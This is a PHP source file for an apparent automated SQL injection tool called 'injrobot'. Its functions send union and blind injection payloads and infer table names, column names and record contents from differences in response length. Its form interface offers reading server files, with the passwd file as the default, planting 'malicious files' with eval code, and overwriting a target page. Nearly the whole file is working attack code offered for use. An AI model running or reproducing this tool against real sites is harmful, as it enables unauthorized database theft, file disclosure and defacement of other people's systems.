<?php
include("var.php");
//set_time_limit(60);
//===================Functions======================
function _log()
{
    $ip = (empty($_SERVER['REMOTE_ADDR'])) ? '����' : $_SERVER['REMOTE_ADDR'];
    $info = (empty($_SERVER['HTTP_USER_AGENT'])) ? '����' : $_SERVER['HTTP_USER_AGENT'];
    $url= (empty($_POST['url'])) ? '����' : $_POST['url'];
    return $ip."!".$info."!".$url;
}
//$dc=@mysqli_connect("localhost","injuser","injP@ss","injdb");

function request($url)
{
    $ch=curl_init($url);
    if (is_resource($ch) === true) {
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $res=curl_exec($ch);
        curl_close($ch);
    }
    return ($res);
}

function multi_request($nodes)
{
    $node_count = count(array($nodes));
    //echo "node_count: ".$node_count;
    //echo "<br>";
    //print_r($nodes);
    $curl_arr = array();
    $master = curl_multi_init();

    for ($i = 0; $i < $node_count; $i++) {
        $url =$nodes[$i];
        $curl_arr[$i] = curl_init($url);
        curl_setopt($curl_arr[$i], CURLOPT_RETURNTRANSFER, true);
        curl_multi_add_handle($master, $curl_arr[$i]);
    }

    do {
        curl_multi_exec($master, $running);
    } while ($running > 0);


    for ($i = 0; $i < $node_count; $i++) {
        $pages[$i] = curl_multi_getcontent($curl_arr[$i]);
        curl_multi_remove_handle($master, $curl_arr[$i]);
    }
    curl_multi_close($master);
    return $pages;
}
function multi_header_request($payloads,$withurl=0)
{
    if ($withurl == 0)
        $payloads = array_map(function($payload) { return $_POST["url"].$payload; }, $payloads);

	foreach($payloads as $key => $payload) {
        $header_data[$key] = get_headers($payload, 1);

	}
	return $header_data;
}

function encrypt($string, $flag) // TODO find builtin encryption function
{
    for ($i=0;$i<strlen($string);$i++) {
		//$str[]=$str[$i].ord(substr($string, $i, 1));
		$encrypted[]=ord(substr($string,$i));
    }
    if ($flag==0) {
        $hash=implode(",", $encrypted);
    }
    if ($flag==1) {
        $hash=implode(")%2BchAr(", $encrypted);
    }
    return "chAr(".$hash.")";
}

function decrypt($string) // TODO find builtin decryption function
{
    $hash=explode(",", $string);
    for ($i=0;$i<sizeof($hash);$i++) {
        $str[]=chr($hash[$i]);
	}
    return explode(",",$str);
}

function is_php($url)
{
    $flag=false;
    preg_match_all("/\.(...)\?/", $url, $out);
    if ($out[1][0]=="php") {
        $flag=true;
    }
    return ($flag);
}

function validat_op($link, $parm, $equal, $f)
{
    $flag=false;
    if ($f==1) {
        $req=request($link);
    } elseif ($f==0) {
        $req=$link;
    }
    if (preg_match_all("/$parm/", $req, $res)) {
        if ($res[1][0]==$equal) {
            $flag=true;
        }
    }
    return $flag;
}

function is_sqlserver($url)
{
    $flag=false;
    $ergT=request($url."'");
    if (preg_match("/.*(ODBC SQL Server Driver).*/", $ergT)) {
        $flag=true;
    }
    return ($flag);
}

function iteration($msg)
{
    $flag=false;
    $mypat="/column '([0-9]+)' in/";
    $mspat="/ORDER BY position number ([0-9]+) is out of range/";
    $jetpat="/recognize '([0-9]+)' as a valid/";
    if (preg_match($mypat, $msg) || preg_match($mspat, $msg) || preg_match($jetpat, $msg)) {
        $flag=true;
    }
    return ($flag);
}

function confirm($kk)
{
    global $url;
    $res[0]=multi_request((array)$url.$kk);

    $kk=str_replace("+", "\+", $kk);
    $result=implode(",", $res);

    if (!preg_match("/(".$kk.")/", $result)) {
        return true;
    } else {
        return false;
    }
}

// this function clean the error message from iteration strings, to return it to the constant form for comparative reasons
function error_cls($pages)
{
    global $url,$arrayQ1;
    $adjustPages=array();
    for ($i=0; $i<count($pages); $i++) {
        $pattern=preg_replace("/http.*=/", "", $arrayQ1[$i]);
        $pattern=str_replace("+", " ", $pattern);
        $adjustPages[$i]=str_replace($pattern, "", $pages[$i]);
    }
    return $adjustPages;
}

function check_vuln($arrayQ,$blind=0)
{
    //global $url,$helps,$trueQ,$com,$arrayQ1;
    $isVuln=false;

	$arrayQ1=str_replace("#", "", $arrayQ);
	$links_headers = multi_header_request($arrayQ1,1);
    //$pages=multi_request($arrayQ1);
    //$pages=error_cls($pages);
    //print_r($pages);
    $j=0;
    for ($i=0; $i<count($links_headers); $i+=2) {
        if ($links_headers[$i]['Content-Length'] != $links_headers[$i+1]['Content-Length']) {
            $isVuln = true;
            break;
        }
    }
    return $isVuln;
}

function inj_make($flag)
{
    //global $url,$helps,$trueQ,$com;
    $url=$_POST["url"];
    //$parms=parse_url($url);
    $baseCLength=get_headers($url, 1);
    $order="+orDer+bY+";
    $helps = array("","'",")","')",'"');
    $com = "--+-";
    $trueQ=$order."1";
    $falseQ=$order."11111";
    $theRquest=array($url.$helps[0].$trueQ."#".$com,$url.$helps[0].$falseQ."#".$com,$url."#".$helps[1]."#".$trueQ."#".$com,$url."#".$helps[1]."#".$falseQ."#".$com,$url."#".$helps[2]."#".$trueQ."#".$com,$url."#".$helps[2]."#".$falseQ."#".$com,$url."#".$helps[3]."#".$trueQ."#".$com,$url."#".$helps[3]."#".$falseQ."#".$com,$url."#".$helps[4]."#".$trueQ."#".$com,$url."#".$helps[4]."#".$falseQ."#".$com);
    $isVuln=check_vuln($theRquest);
    /* 	if (_true($theRquest)==false)
            $isVuln = false;
        else {
            $isVuln = true;
            //list($url,$help,,$com,$truePageLength)=explode("#",_true($theRquest));
        } */
    if ($flag==0) { // just check the vulnerability
        return $isVuln;
    } else { // flag > 0

        // here I want to test even and odd number of columns smultaneusliy
        $even=range(2, 50, 2);
        $odd=range(1, 49, 2);
        for ($i=0; $i<count($even); $i++) {
            $linkEven=$url.$order.$even[$i].$com;
            $linkOdd=$url.$order.$odd[$i].$com;
            $evenHPage=get_headers($linkEven, 1);
            $oddHPage=get_headers($linkOdd, 1);
            //$pages=error_cls($pages);
            if ($evenHPage["Content-Length"]!=$baseCLength["Content-Length"]) {
                $catch=$even[$i];
                break;
            }
            if ($oddHPage["Content-Length"]!=$baseCLength["Content-Length"]) {
                $catch=$odd[$i];
                break;
            }
        }
        $n=$catch;
        for ($j=1;	$j<$n;	$j++) {
            $q[]=str_repeat($j, 3);
        }

        if ($flag==2) {
            $que=@implode(",0x232523),concat(0x232523,", $q);
            $que="concat(0x232523,".$que.",0x232523)";
        } elseif ($flag==1) {
            $que=@implode(",", $q);
        }

        $query="+aNd+1=0+UnIOn+All+sElEcT+".$que;

        return ($url." ".$query." ".$com);
    }
}
function MyStrlen($data)
{
    return strlen($data);
}

function dbinfo()
{
    global $url,$help,$com;
    //$alph = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
    //		'q','r','s','t','u','v','w','x','y','z','_','-','@','.');
    //====== DATABASE VERSION =======
    $true=$url.$help."+aNd+mId(@@vErsIon,1,1)<9".$com;
    $v1=$url.$help."+aNd+mId(@@vErsIon,1,1)=5".$com;
    $v2=$url.$help."+aNd+mId(@@vErsIon,1,1)=4".$com;
    $v3=$url.$help."+aNd+mId(@@vErsIon,1,1)=3".$com;
    $vPages=multi_request(array($true,$v1,$v2,$v3));
    array_walk_recursive($vPages, 'MyStrlen');
    $vNo=array(5,4,3);
    for ($i=1; $i<count($vPages); $i++) {
        if ($vPages[$i]==$vPages[0]) {
            $no=$vNo[$i-1];
            break;
        }
    }
    return "\n[+] Version: ".$no;
}

function getexploit($fullQuery, $withQuery)
{
    global $url;
    list($input, $from, $exquery)=$fullQuery;

    if (empty($exquery)) {
        list($link, $exquery, $com)=explode(" ", inj_make(2, true));
    } elseif (!empty($exquery)) {
        list($link, $exquery, $com)=explode("@-@", $exquery);
    }

    // fetch the exploited page
    $expage=multi_request((array)($link.$exquery.$com));

    // select exploit columns numbers
    preg_match_all("/.*#%#([0-9]{3})#%#.*/s", $expage[0], $exno);
  
    // replace exploit numbers with entered mysql function
    $concat="concat(0x402340,".$input.",0x402340)";
    $orginal="concat(0x232523,".$exno[1][0].",0x232523)";
    $fulPayload=$link.$exquery.$from.$com;
    $_query=str_replace($orginal, $concat, $fulPayload);
  
    // fetch the page with the new query
    $get=multi_request((array)$_query);
    // get the result from the paresed page
    preg_match_all("/.*@#@(.+)@#@.*/s", $get[0], $content);
  
    if (!isset($content) || empty($content)) {
        return false;
    } else {
        //print_r($content);
        if ($withQuery==1) {
            return $content[1][0]."-)(-".$link."@-@".$exquery."@-@".$com;
        } else {
            if (isset($content[1][0])) {
                return $content[1][0];
            }
        }
    }
    return false;
}

function array_unique_advanced($array)
{
    for ($k=0;$k<count($array)-1;$k++) {
        $ar[$k]=current($array);
        $ar[$k+1]=next($array);
    }
    return $ar;
}

function get_tables() { # basePages: true and false pages, getData: 1 to get records  
    $row_no=0; 
    $tbl_len=0;
    $false_tbl_len = "+and+mid((select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,2)>111--+-"; // false table length
    $true_tbl_len = "+and+mid((select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,2)>1--+-"; // false table length
	$baseline = multi_header_request(array($false_tbl_len, $true_tbl_len));
	$false_page = $baseline[0]['Content-Length'];
    $true_page = $baseline[1]['Content-Length'];
    if ($false_page == $true_page) {
        return false;
    }
    do { # Get the total tables
        $q_tbl_count = "+and+mid((select+count(table_name)+from+information_schema.tables+where+table_schema=database()),1,2)>$row_no--+-";
        $r_tbl_count = multi_header_request(array($q_tbl_count));
        do { # get the length for each counted table
            $q_tbl_len = "+and+mid((select+length(table_name)+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),1,2)>$tbl_len--+-";
            $r_tbl_len = multi_header_request(array($q_tbl_len));
            $tbl_len++;
        } while ($r_tbl_len[0]['Content-Length'] == $true_page); # loop until the number reached the total length
            $chr_no=1;
            while ($chr_no < $tbl_len) { # walk through each char in the table name
                for ($s_chr=97 ; $s_chr<123 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $c_chr = $s_chr-32;
                    $b_query_small = "+and+mid((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),$chr_no,1)=char($s_chr)--+-";
                    $b_query_capital = "+and+mid((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),$chr_no,1)=char($c_chr)--+-";
                    $b_queries = multi_header_request(array($b_query_small,$b_query_capital));
                    if ($b_queries[0]['Content-Length'] != $true_page && $b_queries[1]['Content-Length'] != $true_page) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($b_queries[0]['Content-Length'] == $true_page) {
                            $table_chars[$row_no][$chr_no] = $s_chr;
                        } elseif ($b_queries[1]['Content-Length'] == $true_page) {
                            $table_chars[$row_no][$chr_no] = $c_chr;
                        }
                        break;
                    }
                }
                $chr_no++;
            }
        $row_no++;
    } while ($r_tbl_count[0]['Content-Length'] == $true_page);

    foreach ($table_chars as $key => $table) {
        $table_chars[$key] = implode(array_map("chr", $table));
    }
    $tbl_rows = 0; # number of tables in the database;
    $row_no = 0; # number of rows in each table
    do { # loop until no more tables in the database
        do { # loop until no more columns in the table
            $tn = isset($table_chars[$tbl_rows]) ? $table_chars[$tbl_rows] : null;
            $q_col_count = "+and+mid((select+count(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'),1,2)>$row_no--+-";
            $r_col_count = multi_header_request(array($q_col_count));
            if ($r_col_count[0]['Content-Length'] != $true_page) break;
            $col_len = 0; # length of column name;
            do { # get the length for each counted column
                $q_col_len = "+and+mid((select+length(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),1,2)>$col_len--+-";
                $r_col_len = multi_header_request(array($q_col_len));
                $col_len++;
            } while ($r_col_len[0]['Content-Length'] == $true_page);
            $chr_no = 1;
            while ($chr_no < $col_len) { # walk through each char in the column name
                for ($s_chr=97 ; $s_chr<123 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $c_chr = $s_chr-32;
                    $b_query_small = "+and+mid((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),$chr_no,1)=char($s_chr)--+-";
                    $b_query_capital = "+and+mid((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),$chr_no,1)=char($c_chr)--+-";
                    $b_queries = multi_header_request(array($b_query_small,$b_query_capital));
                    if ($b_queries[0]['Content-Length'] != $true_page && $b_queries[1]['Content-Length'] != $true_page) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($b_queries[0]['Content-Length'] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $s_chr;
                        } elseif ($b_queries[1]['Content-Length'] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $c_chr;
                        }
                        break;
                    }
                } # A char found
                $chr_no++;
            } # A column formulated
            $tableName = $table_chars[$tbl_rows];
            //$table_columns_chars["$tableName"][$row_no]=$cell_chars[$row_no];
            $table_columns_chars["$tableName"][$row_no] = isset($cell_chars[$row_no]) ? $cell_chars[$row_no] : null;
            unset($cell_chars);
            $row_no++;
        } while ($r_col_count[0]['Content-Length'] == $true_page); # Found all columns
        //$cols_count[$tbl_rows] = $row_no; # get number of columns for each table, just to print it later for each tble accordingly
        $row_no = 0; # reset rows for the next table
        $tbl_rows++;
    } while ($tbl_rows < sizeof($table_chars));

    foreach ($table_columns_chars as $tbl => $columns) {
        foreach ($columns as $k => $cell) {
            $table_columns_names[$tbl][$k] = implode(array_map("chr", $cell));
        }
    }
    return $table_columns_names;
}

function get_rows($tbl,$col,$rows_no) { # basePages: true and false pages, getData: 1 to get records  
    $false_col_len = "+and+mid((select+length($col)+from+$tbl+limit+0,1),1,2)>111--+-"; // false table length
    $true_col_len = "+and+mid((select+length($col)+from+$tbl+limit+0,1),1,2)>1--+-"; // false table length
	$baseline = multi_header_request(array($false_col_len, $true_col_len));
	$false_page = $baseline[0]['Content-Length'];
    $true_page = $baseline[1]['Content-Length'];
    if ($false_page == $true_page) {
        return false;
    }
    $row_no=0;
    $col_len=0;
    while ($row_no < $rows_no) { # Get the total tables
        //$q_tbl_count = "+and+mid((select+count(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='$tbl'),1,2)>$row_no--+-";
        //$r_tbl_count = multi_header_request(array($q_tbl_count));
        do { # get the length for each counted table
            $q_col_len = "+and+mid((select+length($col)+from+$tbl+limit+$row_no,1),1,2)>$col_len--+-";
            $r_col_len = multi_header_request(array($q_col_len));
            $col_len++;
        } while ($r_col_len[0]['Content-Length'] == $true_page); # loop until the number reached the total length
            $chr_no=1;
            while ($chr_no < $col_len) { # walk through each char in the table name
                for ($s_chr=33 ; $s_chr<=126 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $b_query = "+and+mid((select+$col+from+$tbl+limit+$row_no,1),$chr_no,1)=char($s_chr)--+-";
                    $r_query = multi_header_request(array($b_query));
                    if ($r_query[0]['Content-Length'] != $true_page) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($r_query[0]['Content-Length'] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $s_chr;
                        }
                        break;
                    }
                }
                $chr_no++;
            }
        $row_no++;
    }
    return $cell_chars;
}

function _print($output="")
{
    $tag="";
    $msg="";
    if (!empty($output)) {
        $matched=preg_replace("/^(<\w+>)(.*)/", "$1^$2", $output);
        list($tag, $msg)=explode("^", $matched);
    }
    $color="#0000ff";
    $version = $GLOBALS["version"];
        if ($tag=='<red>') {
            $color="#ff0000";
        } elseif ($tag=='<green>') {
            $color="#00ff00";
        }

        echo <<<_DONE
<form name="injectForm" action="inject.php" method="post" style="direction:ltr;">
<div class="title">Output</div>
<div style="width:675px;margin:0 auto; padding-left:10px">
<textarea rows="7" name="resContent" style="width:565px;color:$color;line-height:25px;font-size:12px" class="input" id="result">
~# $msg
</textarea></div>
<div class="title">SQL Commands</div>
<div style="width:675px;margin:0 auto;padding-left:10px">
<span style="font-size:10px;font-family:Courier New;color:#00EE00">[~]#</span>
<input type="text" name="url" id="url" style="width:465px" class="input" value=""/></div>

<div class="b-row" style="direction:rtl"><input type="submit" name="send" id="submit" value="Inject" onclick="ContentInfo('[-] Make Union Exploit ...')" ></div>

<div class="title">SQLi Opt!ons</div>

<div class="b-row"><input name="choice" id="test" type="radio" value="test" onclick="toggleInput()" checked />
<span style="color:white;font-weight:bold;">Test InjEctable</span></div>

<div class="b-row"><input name="info" id="info" type="checkbox" disabled="true" />
<span >Show DB informaion</span></div>

<div class="b-row"><input name="make" id="make" type="checkbox" disabled="true" />
<span>Make InjEction</span></div>

<div class="b-row"><input name="choice" id="blind" value="chk_blind" type="radio" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">[MySQL All Versions] Blind SQL Injection</span>
<div class="b-row"><input name="blind_all" id="blind_all" type="checkbox" disabled="true" />Step 1. Discover all tables</div>
<div class="b-row"><input name="blind_select" id="blind_select" type="checkbox" disabled="true" />Step 2. Fetch data records</div><br />
<span> Table name<span> <input type="text" name="tbl_name" id="tbl_name" class="input" disabled="true"/>
<span> Column name<span> <input type="text" name="col_name" id="col_name" class="input" disabled="true"/><br/>
<span> Number of records<span> <input type="text" name="rows_no" id="rows_no" class="input" disabled="true"/>

<div class="b-row"><input name="choice" type="radio"  value="chk_mysql5" id="mysql5" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">[MySQL 5.x] Tables Search</span>
<div><input name="accounts" id="accounts" type="checkbox" disabled="true" />Search for accounts tables in all  DBs "may delay a while"</div>
<!--<div><input name="alltbls" id="alltbls" type="checkbox" disabled="true" />Give me ALL tables from the connected database "Oops!, please think twice!"</div>-->
<!--<div><input name="spec" id="spec" type="checkbox" disabled="true" onclick="toggleInput()"/>Search for specified database,table, and/or column </div>
<ul style="margin-top:5px">
	<li><span><input type="checkbox" name="search_type" value="schema" id="schm_id" onclick="toggleInput()"/> Schema<span> <input type="text" name="schm" id="schm_txt" class="input" disabled="true"/>
	<li><span><input type="checkbox" name="search_type" value="table" id="tbl_id" onclick="toggleInput()"/> Table<span> <input type="text" name="tbl" id="tbl_txt" class="input" disabled="true"/>
	<li><span><input type="checkbox" name="search_type" value="column" id="col_id" onclick="toggleInput()"/> Column<span> <input type="text" name="col" id="col_txt" class="input" disabled="true"/>
</ul>-->
</div>

<div class="b-row"><input name="choice" id="chk_asp" type="radio" value="chk_asp" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">[MS SQL Server] Fetch Tables</span></div>

<div class="title">Brute Force Opt!ons</div>

<div class="b-row"><input name="choice" type="radio" value="chk_mysql4" id="mysql4" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">[MySQL 4.x] Tables/Columns Bruteforcing</span></div>

<div class="b-row">Prefix to strengthen Attack *Just for experts!*
<div class="b-row"><input type="text" class="input" name="tblpre" id="tblpre" style="width:70px;" disabled="true" />
<span> For tables&nbsp;&nbsp;&nbsp;&nbsp;</span>
<input type="text" class="input" name="colpre" id="colpre" style="width:70px" disabled="true" />
<span> For columns</span></div>
<div class="example">Ex: prefix_name</div></div>

<div class="b-row"><input name="choice" id="chk_jet" type="radio" value="chk_jet" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">[MS Access/JET/SQL Server] Tables/Columns Bruteforcing</span></div>

<div class="title">Painful Attack Opt!ons</div>

<div class="b-row"><input name="choice" type="radio" value="passwd" id="passwd" onclick="toggleInput()" />
<span style="color:white;font-weight:bold;">Fetch files</span></div>

<div class="b-row"><input type="text" name="file" style="width:200px" class="input" value="" id="file" disabled="true" />
<span style="color:white;">File path "passwd file is default"</span></div>

<div class="b-row"><input name="choice" type="radio" value="injfile" id="injfile" onclick="toggleInput()" /><span style="color:white;font-weight:bold;">InjEcting malicious files</span></div>

<div class="b-row"> Directory path "available to write more than one path to each line"<div class="b-row">
<textarea ROWS=2 NAME="pathcr" id="pathcr" dir="ltr" class="input" disabled="true" /></textarea></div></div>

<div class="b-row"><span dir="ltr"><input type="text" name="code" class="input" style="width:200px" id="code" disabled="true" /></span>
<span style="color:white;">  Malicious code "eval code is default"</span>
<div class="example">Ex: <&#63; phpinfo() &#63;></div></div>

<div class="b-row"><input type="radio" name="choice" id="updtchk" value="updtchk" onclick="toggleInput()" />
<span style="font-weight:bold;">[SQL Server] Attack target Page</span></div>

<div class="b-row"><input type="text" class="input" name="tbl" id="tbl" style="width:100px;" disabled="true" />
<span>  Table</span>
<input type="text" class="input" name="col" id="col" style="width:100px;" disabled="true" />
<span> Column "for more columns use a comma"</span></div>

<div class="b-row"><input type="text" class="input" name="index" id="update" style="width:250px;" />
<span>  Your Page! "phrases, malicious codes,..."</span></div>

<div id="footer">MIT License 2008-2020 injrobot $version - By TrX(TM)
</div>
</form>
</div>
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-10799151-2");
pageTracker._trackPageview();
} catch(err) {}</script>
</body>
</html>
_DONE;
}
//=================== End Functions ========================
